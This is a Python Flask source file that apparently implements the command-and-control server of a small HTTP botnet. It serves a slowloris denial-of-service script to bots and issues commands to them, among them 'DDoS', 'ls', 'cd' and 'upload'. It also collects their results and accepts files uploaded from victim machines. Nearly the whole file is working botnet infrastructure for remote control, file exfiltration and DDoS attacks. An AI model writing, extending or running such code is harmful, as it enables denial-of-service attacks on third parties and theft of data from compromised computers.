from flask import Flask, request, send_file, request
import socket
import os
import requests

SLPort = "8888"

avail_commands = ["Standby", "DDoS", "pwd", "ls", "cd", "upload"]

current_command = "pwd"
path = "/"

app = Flask(__name__)

@app.route('/')
def home():
    return "Hello, world"
@app.route('/get_script')
def get_script():
    try:
        return send_file('/home/thang/Desktop/HTTPbot/slowloris.py', attachment_filename='slowloris.py')
    except Exception as e:
	    return str(e)

@app.route('/set_action', methods = ['POST'])
def set_action():
	global current_command
	global path
	body = request.get_json()
	# print(body['command'], body['path'])
	if "command" in body and body["command"] in avail_commands:
		current_command = body["command"]
		print(current_command)
		if 'path' in body:
			path = body['path']
		else:
			path = ''

	return '200'


@app.route("/result", methods = ['POST'])
def result():
	body = request.get_json()
	print(body)
	return body

@app.route("/repository", methods = ['POST'])
def upload_file():
	file = request.files['file']
	file.save(os.path.join(".", file.filename))
	return '200'
    
@app.route('/get_command', methods = ['GET'])
def get_command():
    return current_command + " " + path


if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0')